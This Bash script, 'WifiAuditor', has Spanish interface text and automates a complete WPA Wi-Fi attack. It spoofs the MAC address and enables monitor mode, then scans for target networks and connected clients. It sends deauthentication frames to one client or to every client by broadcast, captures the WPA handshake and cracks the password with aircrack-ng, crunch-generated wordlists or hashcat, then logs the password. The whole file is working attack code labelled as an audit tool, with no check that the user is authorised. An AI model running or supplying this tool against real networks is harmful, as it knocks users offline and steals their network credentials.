#!/bin/bash

# =========================================================
# WifiAuditor - Herramienta de Auditoría WiFi Avanzada
# Versión 2.0
# =========================================================

# Configuración de colores y estilos
declare -r END_COLOR="$(tput sgr0)"
declare -r RED="$(tput setaf 1)"
declare -r GREEN="$(tput setaf 2)"
declare -r YELLOW="$(tput setaf 3)"
declare -r BLUE="$(tput setaf 4)"
declare -r PURPLE="$(tput setaf 5)"
declare -r CYAN="$(tput setaf 6)"
declare -r WHITE="$(tput setaf 7)"
declare -r BOLD="$(tput bold)"
declare -r UNDERLINE="$(tput smul)"

# Directorio de capturas
CAPTURE_DIR="captures"
LOG_FILE="$CAPTURE_DIR/wifiauditor.log"

# Variables globales
declare -A PROCESSES
declare -a SERVICES=("wpa_supplicant.service" "NetworkManager.service" "dhcpcd.service")
INTERFACE=""
ESSID=""
BSSID=""
CHANNEL=""
HANDSHAKE_FILE=""
DICTIONARY_FILE=""
CLIENT_MAC=""
DEAUTH_COUNT=10
XTERM_BG_COLOR="black"
VERBOSE=false

# =========================================================
# Funciones de UI
# =========================================================

print_banner() {
  clear
  echo -e "${BOLD}${PURPLE}"
  echo "██╗    ██╗██╗███████╗██╗     █████╗ ██╗   ██╗██████╗ ██╗████████╗ ██████╗ ██████╗ "
  echo "██║    ██║██║██╔════╝██║    ██╔══██╗██║   ██║██╔══██╗██║╚══██╔══╝██╔═══██╗██╔══██╗"
  echo "██║ █╗ ██║██║█████╗  ██║    ███████║██║   ██║██║  ██║██║   ██║   ██║   ██║██████╔╝"
  echo "██║███╗██║██║██╔══╝  ██║    ██╔══██║██║   ██║██║  ██║██║   ██║   ██║   ██║██╔══██╗"
  echo "╚███╔███╔╝██║██║     ██║    ██║  ██║╚██████╔╝██████╔╝██║   ██║   ╚██████╔╝██║  ██║"
  echo " ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝"
  echo -e "${END_COLOR}"
  echo -e "${CYAN}${BOLD}Herramienta Avanzada de Auditoría WiFi - Versión 2.0${END_COLOR}"
  echo -e "${BLUE}${UNDERLINE}Modo de uso: Deautenticación + Captura de Handshake + Descifrado${END_COLOR}\n"
}

status_message() {
  echo -e "[${BLUE}*${END_COLOR}] $1"
}

success_message() {
  echo -e "\n[${GREEN}✓${END_COLOR}] $1"
}

error_message() {
  echo -e "\n[${RED}✗${END_COLOR}] $1"
  write_log "ERROR: $1"

  if [[ $2 == "exit" ]]; then
    cleanup
    exit 1
  fi
}

warning_message() {
  echo -e "[${YELLOW}!${END_COLOR}] $1"
}

input_message() {
  echo -en "[${PURPLE}?${END_COLOR}] ${CYAN}$1${END_COLOR}"
}

progress_bar() {
  local duration=$1
  local steps=25
  local step_duration=$(echo "scale=3; $duration/$steps" | bc)

  echo -ne "["
  for ((i = 0; i < steps; i++)); do
    echo -ne "${GREEN}▓${END_COLOR}"
    sleep $step_duration
  done
  echo -e "]"
}

write_log() {
  if [ ! -d "$CAPTURE_DIR" ]; then
    mkdir -p "$CAPTURE_DIR"
  fi

  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >>"$LOG_FILE"
}

# =========================================================
# Funciones de verificación
# =========================================================

check_dependencies() {
  local dependencies=("aircrack-ng" "macchanger" "xterm" "bc" "hashcat" "crunch")
  local missing_dependencies=()

  status_message "Verificando dependencias necesarias..."

  for program in "${dependencies[@]}"; do
    if ! command -v "$program" >/dev/null 2>&1; then
      missing_dependencies+=("$program")
    fi
  done

  if [[ ${#missing_dependencies[@]} -gt 0 ]]; then
    local missing_str=$(IFS=", "; echo "${missing_dependencies[*]}")
    error_message "Faltan las siguientes dependencias: $missing_str. Instálalas con 'sudo apt install $missing_str'" "exit"
  else
      if [[ $VERBOSE == true ]]; then
        success_message "Todas las dependencias están instaladas correctamente"
      fi
  fi
}

check_root() {
  if [ "$(id -u)" != "0" ]; then
    error_message "Este script debe ejecutarse como root. Intenta con 'sudo $0'" "exit"
  fi
}

select_interface() {
  status_message "Detectando interfaces de red disponibles..."

  local interfaces=$(iw dev | grep Interface | awk '{print $2}')

  if [[ -z "$interfaces" ]]; then
    error_message "No se encontraron interfaces de red inalámbricas" "exit"
  fi

  echo -e "\n${YELLOW}Interfaces disponibles:${END_COLOR}"
  local i=1
  local interface_array=()

  while read -r interface; do
    interface_array+=("$interface")
    echo -e "  ${WHITE}$i)${END_COLOR} $interface"
    ((i++))
  done <<<"$interfaces"

  local selection
  input_message "Selecciona la interfaz a utilizar [1-$((i - 1))]: "
  read -r selection

  if [[ ! "$selection" =~ ^[0-9]+$ ]] || [ "$selection" -lt 1 ] || [ "$selection" -gt $((i - 1)) ]; then
    error_message "Selección inválida" "exit"
  fi

  INTERFACE="${interface_array[$((selection - 1))]}"
  success_message "Interfaz seleccionada: $INTERFACE"
  write_log "Interfaz seleccionada: $INTERFACE"
}

# =========================================================
# Funciones de red
# =========================================================

set_monitor_mode() {
  status_message "Configurando modo monitor en $INTERFACE..."

  # Desactivar la interfaz para modificarla
  ip link set "$INTERFACE" down

  # Cambiar la dirección MAC
  status_message "Aplicando MAC aleatoria..."
  if ! macchanger -a "$INTERFACE" >/dev/null 2>&1; then
    error_message "Error al cambiar la dirección MAC" "exit"
  fi

  # Verificar si ya está en modo monitor
  if iw dev | grep -A 5 "$INTERFACE" | grep "type monitor" >/dev/null 2>&1; then
    warning_message "La interfaz ya está en modo monitor"
  else
    # Matar procesos que puedan interferir
    status_message "Matando procesos que interfieren..."
    if ! airmon-ng check kill >/dev/null 2>&1; then
      warning_message "Problemas al matar procesos. Continuando de todos modos..."
    fi

    # Configurar modo monitor
    status_message "Activando modo monitor..."
    if ! iw "$INTERFACE" set type monitor >/dev/null 2>&1; then
      if ! airmon-ng start "$INTERFACE" >/dev/null 2>&1; then
        error_message "Error al configurar el modo monitor" "exit"
      fi
    fi
  fi

  # Activar la interfaz
  ip link set "$INTERFACE" up

  # Verificar que se haya activado correctamente
  if ! iw dev | grep -A 5 "$INTERFACE" | grep "type monitor" >/dev/null 2>&1; then
    error_message "No se pudo configurar el modo monitor" "exit"
  fi

  # Mostrar configuración actual
  echo -e "\n${YELLOW}Configuración actual de la interfaz:${END_COLOR}"
  iw dev | grep -A 5 "$INTERFACE"
  echo -e "\n${YELLOW}Dirección MAC:${END_COLOR}"
  macchanger -s "$INTERFACE"

  success_message "Modo monitor configurado correctamente en $INTERFACE"
  write_log "Modo monitor activado en $INTERFACE"
}

reset_interface() {
  status_message "Restaurando interfaz a modo normal..."

  # Desactivar interfaz para modificarla
  ip link set "$INTERFACE" down >/dev/null 2>&1

  # Restaurar modo managed
  status_message "Configurando modo managed..."
  if ! iw "$INTERFACE" set type managed >/dev/null 2>&1; then
    warning_message "Error al configurar modo managed"
  fi

  # Restaurar MAC original
  status_message "Restaurando MAC original..."
  if ! macchanger -p "$INTERFACE" >/dev/null 2>&1; then
    warning_message "Error al restaurar MAC original"
  fi

  # Activar la interfaz
  ip link set "$INTERFACE" up >/dev/null 2>&1

  # Reiniciar servicios de red
  status_message "Reiniciando servicios de red..."
  for service in "${SERVICES[@]}"; do
    systemctl restart "$service" >/dev/null 2>&1
    if [[ $? -ne 0 ]]; then
      warning_message "Error al reiniciar $service"
    fi
  done

  success_message "Interfaz restaurada correctamente"
  write_log "Interfaz restaurada a modo normal"
}

scan_networks() {
  status_message "Iniciando escaneo de redes WiFi..."
  write_log "Iniciando escaneo de redes WiFi"

  # Crear directorio para capturas si no existe
  if [ ! -d "$CAPTURE_DIR" ]; then
    mkdir -p "$CAPTURE_DIR"
  fi

  # Archivo temporal para resultados
  local temp_file="$CAPTURE_DIR/temp_scan.txt"

  # Escanear redes
  status_message "Escaneando redes (presiona Ctrl+C cuando veas la red objetivo)..."
  xterm -title "Escaneo de Redes WiFi" -bg "$XTERM_BG_COLOR" -fg green -geometry 100x30 \
    -e "airodump-ng --wps --manufacturer $INTERFACE -w $CAPTURE_DIR/scan --output-format csv" &
  PROCESSES["airodump_scan"]=$!

  # Esperar a que el usuario detenga el escaneo
  trap 'kill -9 ${PROCESSES["airodump_scan"]} 2>/dev/null; echo -e "\n${YELLOW}Escaneo pausado. Presiona Ctrl+C de nuevo para actualizar la lista o espera a que termine.${END_COLOR}";' SIGINT
  while kill -0 ${PROCESSES["airodump_scan"]} 2>/dev/null; do
    # Procesar resultados
    if [ -f "$CAPTURE_DIR/scan-01.csv" ]; then
      status_message "Procesando resultados del escaneo..."

      # Extraer y mostrar redes detectadas
    echo -e "\n${YELLOW}Redes WiFi detectadas:${END_COLOR}"
    echo -e "${WHITE}ID  BSSID             CANAL  POTENCIA  CIFRADO      ESSID${END_COLOR}"
    echo -e "${WHITE}--- ----------------- ------ --------- ------------ -----------------${END_COLOR}"

    grep -a -A 100 "Station MAC" "$CAPTURE_DIR/scan-01.csv" | grep -v "Station MAC" |
      awk -F, '{print $1","$2","$4","$6","$8","$14}' | sed 's/,/ /g' |
      awk '{print $1,$2,$3,$4,$5,$6}' | sort -u | sort -k4 -n >"$temp_file"

      local i=1

      while read -r line; do
        if [[ ! -z "$line" ]]; then
          printf "${WHITE}%-3s %-18s %-6s %-9s %-11s %-s${END_COLOR}\n" \
            "$i" $(echo "$line" | awk '{print $1,$2,$3,$4,$5,$6}')
          ((i++))
        fi
      done <"$temp_file"

      # Borrar el archivo temporal para la siguiente iteración
      rm -f "$temp_file"
    else
      warning_message "No se encontraron resultados del escaneo"
    fi
    sleep 1
  done
  trap - SIGINT

    #Reprocesar para la seleccion final
    grep -a -A 100 "Station MAC" "$CAPTURE_DIR/scan-01.csv" | grep -v "Station MAC" |
      awk -F, '{print $1","$4","$9","$14}' | sort -k3 -n | sed 's/,/ /g' | awk '{print $1, $2, $4}' | sort -u > "$temp_file"

    local i=1

    while read -r line; do
      if [[ ! -z "$line" ]]; then
        printf "${WHITE}%-3s %-18s %-6s %-9s %-s${END_COLOR}\n" \
          "$i" $(echo "$line" | awk '{print $1, $2, $3}')
        ((i++))
      fi
    done <"$temp_file"

    # Seleccionar red objetivo
    local selection
    input_message "Selecciona la red objetivo [1-$((i - 1))]: "
    read -r selection

    if [[ ! "$selection" =~ ^[0-9]+$ ]] || [ "$selection" -lt 1 ] || [ "$selection" -gt $((i - 1)) ]; then
      error_message "Selección inválida" "exit"
    fi

    # Obtener información de la red seleccionada
    local target_line=$(sed -n "${selection}p" "$temp_file")
    BSSID=$(echo "$target_line" | awk '{print $1}')
    CHANNEL=$(echo "$target_line" | awk '{print $2}')
    ESSID=$(echo "$target_line" | awk '{print $3}')


    # Limpiar archivos temporales
    rm -f "$CAPTURE_DIR/scan-01.csv" "$temp_file"

    success_message "Red objetivo seleccionada: $ESSID ($BSSID) en canal $CHANNEL"
    write_log "Red objetivo: $ESSID ($BSSID) en canal $CHANNEL"
}

scan_clients() {
  status_message "Escaneando clientes conectados a $ESSID..."
  write_log "Escaneando clientes conectados a $ESSID"

  # Archivo temporal para resultados
  local temp_file="$CAPTURE_DIR/temp_clients.txt"

  # Escanear clientes
  xterm -title "Escaneo de Clientes - $ESSID" -bg "$XTERM_BG_COLOR" -fg cyan -geometry 100x30 \
    -e "airodump-ng --bssid $BSSID -c $CHANNEL $INTERFACE -w $CAPTURE_DIR/clients --output-format csv" &
  PROCESSES["airodump_clients"]=$!

  # Esperar a que el usuario detenga el escaneo
  status_message "Escaneando clientes (presiona Ctrl+C cuando veas clientes conectados)..."
  trap 'kill -9 ${PROCESSES["airodump_clients"]} 2>/dev/null; break' SIGINT
  while kill -0 ${PROCESSES["airodump_clients"]} 2>/dev/null; do
    sleep 1
  done
  trap - SIGINT

  # Procesar resultados
  if [ -f "$CAPTURE_DIR/clients-01.csv" ]; then
    # Extraer y mostrar clientes detectados
    echo -e "\n${YELLOW}Clientes conectados a $ESSID:${END_COLOR}"
    echo -e "${WHITE}ID  MAC               PAQUETES  POTENCIA${END_COLOR}"
    echo -e "${WHITE}--- ----------------- --------- ---------${END_COLOR}"

    grep -a -A 100 "Station MAC" "$CAPTURE_DIR/clients-01.csv" | grep "$BSSID" -B 100 -A 100 |
      awk -F, '{if($1 != "Station MAC" && $6 == " '"$BSSID"'") print $1","$4","$6}' |
      sort -u >"$temp_file"

    local i=1
    local client_count=0
    while read -r line; do
      if [[ ! -z "$line" ]]; then
        local client_mac=$(echo "$line" | cut -d ',' -f 1 | tr -d ' ')
        local packets=$(echo "$line" | cut -d ',' -f 2 | tr -d ' ')
        local power=$(echo "$line" | cut -d ',' -f 3 | tr -d ' ')

        printf "${WHITE}%-3s %-18s %-9s %-9s${END_COLOR}\n" \
          "$i" "$client_mac" "$packets" "$power"
        ((i++))
        ((client_count++))
      fi
    done <"$temp_file"

    # Si no hay clientes, ofrecer hacer deauth broadcast
    if [ $client_count -eq 0 ]; then
      warning_message "No se detectaron clientes conectados a $ESSID"
      input_message "¿Deseas realizar un ataque de deautenticación a broadcast? [s/n]: "
      read -r choice

      if [[ "$choice" =~ ^[Ss]$ ]]; then
        CLIENT_MAC="FF:FF:FF:FF:FF:FF"
        success_message "Se utilizará broadcast para el ataque de deautenticación"
      else
        error_message "Se necesitan clientes conectados para continuar" "exit"
      fi
    else
      # Seleccionar cliente objetivo
      input_message "Selecciona el cliente objetivo [1-$client_count] (0 para broadcast): "
      read -r selection

      if [[ "$selection" == "0" ]]; then
        CLIENT_MAC="FF:FF:FF:FF:FF:FF"
        success_message "Se utilizará broadcast para el ataque de deautenticación"
      elif [[ ! "$selection" =~ ^[0-9]+$ ]] || [ "$selection" -lt 1 ] || [ "$selection" -gt $client_count ]; then
        error_message "Selección inválida" "exit"
      else
        CLIENT_MAC=$(sed -n "${selection}p" "$temp_file" | cut -d ',' -f 1 | tr -d ' ')
        success_message "Cliente objetivo seleccionado: $CLIENT_MAC"
      fi
    fi

    # Limpiar archivos temporales
    rm -f "$CAPTURE_DIR/clients-01.csv" "$temp_file"

    write_log "Cliente objetivo: $CLIENT_MAC"
  else
    warning_message "No se encontraron resultados del escaneo de clientes"
    input_message "¿Deseas realizar un ataque de deautenticación a broadcast? [s/n]: "
    read -r choice

    if [[ "$choice" =~ ^[Ss]$ ]]; then
      CLIENT_MAC="FF:FF:FF:FF:FF:FF"
      success_message "Se utilizará broadcast para el ataque de deautenticación"
    else
      error_message "Se necesitan clientes conectados para continuar" "exit"
    fi
  fi
}

deauth_attack() {
  status_message "Preparando ataque de deautenticación..."

  # Crear directorio específico para la red
  local target_dir="$CAPTURE_DIR/$ESSID"
  if [ ! -d "$target_dir" ]; then
    mkdir -p "$target_dir"
  fi

  # Solicitar número de paquetes de deauth
  input_message "Número de paquetes de deautenticación a enviar [10]: "
  read -r packets

  if [[ -z "$packets" ]]; then
    packets=10
  elif [[ ! "$packets" =~ ^[0-9]+$ ]]; then
    warning_message "Valor inválido, usando 10 paquetes por defecto"
    packets=10
  fi

  # Mostrar información del ataque
  echo -e "\n${YELLOW}Información del ataque:${END_COLOR}"
  echo -e "  ${WHITE}Red objetivo:${END_COLOR} $ESSID ($BSSID)"
  echo -e "  ${WHITE}Canal:${END_COLOR} $CHANNEL"
  echo -e "  ${WHITE}Cliente:${END_COLOR} $CLIENT_MAC"
  echo -e "  ${WHITE}Paquetes:${END_COLOR} $packets"

  # Confirmar ataque
  input_message "¿Iniciar ataque de deautenticación? [s/n]: "
  read -r confirm

  if [[ ! "$confirm" =~ ^[Ss]$ ]]; then
    error_message "Ataque cancelado por el usuario" "exit"
  fi

  write_log "Iniciando ataque de deautenticación contra $ESSID ($BSSID) usando cliente $CLIENT_MAC con $packets paquetes"

  # Iniciar captura de handshake
  status_message "Iniciando captura de handshake..."
  xterm -title "Captura de Handshake - $ESSID" -bg "$XTERM_BG_COLOR" -fg green -geometry 100x30 \
    -e "airodump-ng --bssid $BSSID -c $CHANNEL -w $target_dir/$ESSID $INTERFACE" &
  PROCESSES["airodump_capture"]=$!

  # Esperar un momento para que airodump inicie correctamente
  sleep 2

  # Iniciar ataque de deautenticación
  status_message "Enviando paquetes de deautenticación..."
  xterm -title "Deautenticación - $ESSID" -bg "$XTERM_BG_COLOR" -fg red -geometry 80x20 \
    -e "aireplay-ng -0 $packets -a $BSSID -c $CLIENT_MAC $INTERFACE && echo -e '\n[*] Ataque completado. Cierra esta ventana.'" &
  PROCESSES["aireplay_deauth"]=$!

  # Esperar a que termine el ataque de deauth
  wait ${PROCESSES["aireplay_deauth"]}

  # Esperar a que el usuario confirme la captura del handshake
  status_message "Esperando captura de handshake (presiona Ctrl+C cuando veas WPA handshake)..."

  # Configurar el nombre del archivo de captura
  HANDSHAKE_FILE="$target_dir/$ESSID-01.cap"

  # Esperar a que el usuario detenga la captura
  trap 'kill -9 ${PROCESSES["airodump_capture"]} 2>/dev/null; break' SIGINT
  while kill -0 ${PROCESSES["airodump_capture"]} 2>/dev/null; do
    sleep 1
  done
  trap - SIGINT

  # Verificar si se capturó el handshake
  if [ -f "$HANDSHAKE_FILE" ]; then
    status_message "Verificando captura de handshake..."

    if aircrack-ng -J "$target_dir/test" "$HANDSHAKE_FILE" | grep -q "handshake"; then
      success_message "Handshake capturado correctamente"
      write_log "Handshake capturado correctamente para $ESSID"

      # Limpiar archivos temporales
      rm -f "$target_dir/test.hccap" 2>/dev/null

      return 0
    else
      warning_message "No se detectó handshake en la captura"
      input_message "¿Deseas intentar otro ataque de deautenticación? [s/n]: "
      read -r retry

      if [[ "$retry" =~ ^[Ss]$ ]]; then
        deauth_attack
        return $?
      else
        error_message "No se pudo capturar el handshake" "exit"
      fi
    fi
  else
    error_message "No se generó el archivo de captura" "exit"
  fi
}

# =========================================================
# Funciones de descifrado
# =========================================================

crack_password() {
  if [ ! -f "$HANDSHAKE_FILE" ]; then
    error_message "No se encontró el archivo de handshake" "exit"
  fi

  status_message "Preparando para descifrar el handshake..."

  # Opciones de descifrado
  echo -e "\n${YELLOW}Opciones de descifrado:${END_COLOR}"
  echo -e "  ${WHITE}1)${END_COLOR} Usar un diccionario existente"
  echo -e "  ${WHITE}2)${END_COLOR} Generar un diccionario personalizado"
  echo -e "  ${WHITE}3)${END_COLOR} Convertir a formato HCCAPX y guardar para uso posterior"

  input_message "Selecciona una opción [1-3]: "
  read -r crack_option

  case "$crack_option" in
  1)
    # Usar diccionario existente
    input_message "Ruta al diccionario: "
    read -r DICTIONARY_FILE

    if [ ! -f "$DICTIONARY_FILE" ]; then
      error_message "No se encontró el diccionario especificado" "exit"
    fi

    status_message "Iniciando descifrado con diccionario..."
    write_log "Iniciando descifrado de $ESSID con diccionario $DICTIONARY_FILE"

    xterm -title "Descifrado de $ESSID" -bg "$XTERM_BG_COLOR" -fg yellow -geometry 100x30 \
      -e "aircrack-ng -w \"$DICTIONARY_FILE\" \"$HANDSHAKE_FILE\" -l \"$CAPTURE_DIR/$ESSID/password.txt\"; echo -e '\n[*] Presiona ENTER para continuar'; read" &
    PROCESSES["aircrack"]=$!

    # Esperar a que termine el proceso de descifrado
    wait ${PROCESSES["aircrack"]}
    ;;

  2)
    # Generar diccionario personalizado
    status_message "Configuración para generar diccionario personalizado..."

    local min_length
    local max_length
    local charset
    local output_file="$CAPTURE_DIR/$ESSID/diccionario.txt"

    input_message "Longitud mínima de contraseña [8]: "
    read -r min_length
    min_length=${min_length:-8}

    input_message "Longitud máxima de contraseña [12]: "
    read -r max_length
    max_length=${max_length:-12}

    echo -e "\n${YELLOW}Conjuntos de caracteres disponibles:${END_COLOR}"
    echo -e "  ${WHITE}1)${END_COLOR} Solo minúsculas (a-z)"
    echo -e "  ${WHITE}2)${END_COLOR} Minúsculas y mayúsculas (a-zA-Z)"
    echo -e "  ${WHITE}3)${END_COLOR} Alfanuméricos (a-zA-Z0-9)"
    echo -e "  ${WHITE}4)${END_COLOR} Alfanuméricos + símbolos"
    echo -e "  ${WHITE}5)${END_COLOR} Personalizado"

    input_message "Selecciona un conjunto de caracteres [1-5]: "
    read -r charset_option

    case "$charset_option" in
    1) charset="abcdefghijklmnopqrstuvwxyz" ;;
    2) charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" ;;
    3) charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" ;;
    4) charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?" ;;
    5)
      input_message "Introduce los caracteres a utilizar: "
      read -r charset
      ;;
    *)
      warning_message "Opción inválida, usando alfanuméricos"
      charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
      ;;
    esac

    # Advertir sobre el tamaño potencial del diccionario
    local total_combinations=$(echo "$charset" | wc -c)
    total_combinations=$((total_combinations - 1)) # Restar 1 por el carácter de nueva línea

    local estimated_size=0
    for ((i = min_length; i <= max_length; i++)); do
      local combinations=$(echo "$total_combinations^$i" | bc)
      estimated_size=$((estimated_size + combinations))
    done

    warning_message "El diccionario generará aproximadamente $estimated_size combinaciones"
    warning_message "Esto puede consumir mucho espacio en disco y tiempo"

    input_message "¿Continuar con la generación? [s/n]: "
    read -r confirm

    if [[ ! "$confirm" =~ ^[Ss]$ ]]; then
      error_message "Generación de diccionario cancelada" "exit"
    fi

    status_message "Generando diccionario personalizado..."
    write_log "Generando diccionario personalizado para $ESSID (longitud $min_length-$max_length)"

    xterm -title "Generando Diccionario" -bg "$XTERM_BG_COLOR" -fg yellow -geometry 100x30 \
      -e "crunch $min_length $max_length $charset -o \"$output_file\"; echo -e '\n[*] Presiona ENTER para continuar'; read" &
    PROCESSES["crunch"]=$!

    # Esperar a que termine la generación del diccionario
    wait ${PROCESSES["crunch"]}

    if [ ! -f "$output_file" ]; then
      error_message "Error al generar el diccionario" "exit"
    fi

    success_message "Diccionario generado exitosamente en: $output_file"

    # Usar el diccionario generado para el cracking
    status_message "Iniciando descifrado con el diccionario generado..."
    write_log "Iniciando descifrado de $ESSID con diccionario generado"

    xterm -title "Descifrado de $ESSID" -bg "$XTERM_BG_COLOR" -fg yellow -geometry 100x30 \
      -e "aircrack-ng -w \"$output_file\" \"$HANDSHAKE_FILE\" -l \"$CAPTURE_DIR/$ESSID/password.txt\"; echo -e '\n[*] Presiona ENTER para continuar'; read" &
    PROCESSES["aircrack"]=$!

    # Esperar a que termine el proceso de descifrado
    wait ${PROCESSES["aircrack"]}
    ;;

  3)
    # Convertir a formato HCCAPX
    local hccapx_file="$CAPTURE_DIR/$ESSID/$ESSID.hccapx"

    status_message "Convirtiendo captura a formato HCCAPX..."
    write_log "Convirtiendo captura de $ESSID a formato HCCAPX"

    if ! aircrack-ng -J "$CAPTURE_DIR/$ESSID/temp" "$HANDSHAKE_FILE" >/dev/null 2>&1; then
      error_message "Error al convertir la captura" "exit"
    fi

    # Renombrar y mover el archivo
    if [ -f "$CAPTURE_DIR/$ESSID/temp.hccap" ]; then
      mv "$CAPTURE_DIR/$ESSID/temp.hccap" "$hccapx_file"
      success_message "Captura convertida exitosamente a: $hccapx_file"
      write_log "Captura convertida exitosamente a: $hccapx_file"
    else
      error_message "Error al convertir la captura" "exit"
    fi

    # Preguntar si desea iniciar el descifrado con hashcat
    input_message "¿Deseas iniciar el descifrado con hashcat? [s/n]: "
    read -r hashcat_option

    if [[ "$hashcat_option" =~ ^[Ss]$ ]]; then
      input_message "Ruta al diccionario: "
      read -r DICTIONARY_FILE

      if [ ! -f "$DICTIONARY_FILE" ]; then
        error_message "No se encontró el diccionario especificado" "exit"
      fi

      status_message "Iniciando descifrado con hashcat..."
      write_log "Iniciando descifrado de $ESSID con hashcat y diccionario $DICTIONARY_FILE"

      xterm -title "Hashcat - Descifrado de $ESSID" -bg "$XTERM_BG_COLOR" -fg yellow -geometry 100x30 \
        -e "hashcat -m 2500 -a 0 \"$hccapx_file\" \"$DICTIONARY_FILE\" -o \"$CAPTURE_DIR/$ESSID/password.txt\"; echo -e '\n[*] Presiona ENTER para continuar'; read" &
      PROCESSES["hashcat"]=$!

      # Esperar a que termine el proceso de descifrado
      wait ${PROCESSES["hashcat"]}
    else
      success_message "Archivo HCCAPX guardado para uso posterior"
    fi
    ;;

  *)
    error_message "Opción inválida" "exit"
    ;;
  esac

  # Verificar si se encontró la contraseña
  if [ -f "$CAPTURE_DIR/$ESSID/password.txt" ] && [ -s "$CAPTURE_DIR/$ESSID/password.txt" ]; then
    local password=$(cat "$CAPTURE_DIR/$ESSID/password.txt")
    success_message "¡Contraseña encontrada para $ESSID: $password"
    write_log "Contraseña encontrada para $ESSID: $password"
  else
    warning_message "No se pudo encontrar la contraseña con el método seleccionado"
    write_log "No se pudo encontrar la contraseña para $ESSID"
  fi
}

# =========================================================
# Limpieza y manejo de señales
# =========================================================

cleanup() {
  status_message "Limpiando y restaurando configuración..."

  # Matar todos los procesos
  for process in "${!PROCESSES[@]}"; do
    if kill -0 ${PROCESSES[$process]} 2>/dev/null; then
      kill -9 ${PROCESSES[$process]} 2>/dev/null
      if [[ $VERBOSE == true ]]; then
        status_message "Proceso $process terminado"
      fi
    fi
  done

  # Restaurar interfaz si estaba en modo monitor
  if isMonitorMode; then
    reset_interface
  fi

  write_log "Programa finalizado"

  success_message "¡Limpieza completada!"
}

isMonitorMode() {
  iw dev | grep -A 5 "$INTERFACE" | grep "type monitor" >/dev/null 2>&1
  return $?
}

# Configurar trap para manejar señales
trap ctrl_c INT

ctrl_c() {
  echo -e "\n${YELLOW}[!] Interrupción detectada...${END_COLOR}"
}

# =========================================================
# Función principal
# =========================================================

show_help() {
  echo -e "${CYAN}${BOLD}WifiAuditor - Herramienta de Auditoría WiFi${END_COLOR}"
  echo -e "${BLUE}Uso:${END_COLOR} $0 [opciones]"
  echo -e "\n${YELLOW}Opciones:${END_COLOR}"
  echo -e "  ${WHITE}-h, --help${END_COLOR}          Muestra esta ayuda"
  echo -e "  ${WHITE}-i, --interface <iface>${END_COLOR}  Especifica la interfaz de red"
  echo -e "  ${WHITE}-v, --verbose${END_COLOR}       Modo verboso para más información"
  echo -e "  ${WHITE}-c, --clean${END_COLOR}         Solo restaura la interfaz y limpia"
  echo -e "\n${YELLOW}Ejemplos:${END_COLOR}"
  echo -e "  $0 -i wlan0"
  echo -e "  $0 --verbose"
  echo -e "  $0 --clean"
}

parse_arguments() {
  while [[ $# -gt 0 ]]; do
    case "$1" in
    -h | --help)
      show_help
      exit 0
      ;;
    -i | --interface)
      INTERFACE="$2"
      shift 2
      ;;
    -v | --verbose)
      VERBOSE=true
      shift
      ;;
    -c | --clean)
      INTERFACE=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
      if [[ -z "$INTERFACE" ]]; then
        error_message "No se encontró interfaz de red" "exit"
      fi
      cleanup
      exit 0
      ;;
    *)
      warning_message "Opción desconocida: $1"
      show_help
      exit 1
      ;;
    esac
  done
}

main() {
  # Verificar que el script se ejecuta como root
  check_root

  # Mostrar banner
  print_banner

  # Parsear argumentos
  parse_arguments "$@"

  # Verificar dependencias
  check_dependencies

  # Seleccionar interfaz si no se especificó
  if [[ -z "$INTERFACE" ]]; then
    select_interface
  fi

  # Configurar modo monitor
  set_monitor_mode

  # Escanear redes
  scan_networks

  # Escanear clientes
  scan_clients

  # Realizar ataque de deautenticación
  deauth_attack

  # Intentar descifrar la contraseña
  crack_password

  # Limpiar y restaurar configuración
  cleanup

  success_message "¡Auditoría completada exitosamente!"
  echo -e "\n${CYAN}${BOLD}Resultados guardados en: $CAPTURE_DIR/$ESSID/${END_COLOR}"
}

# Ejecutar función principal
main "$@"
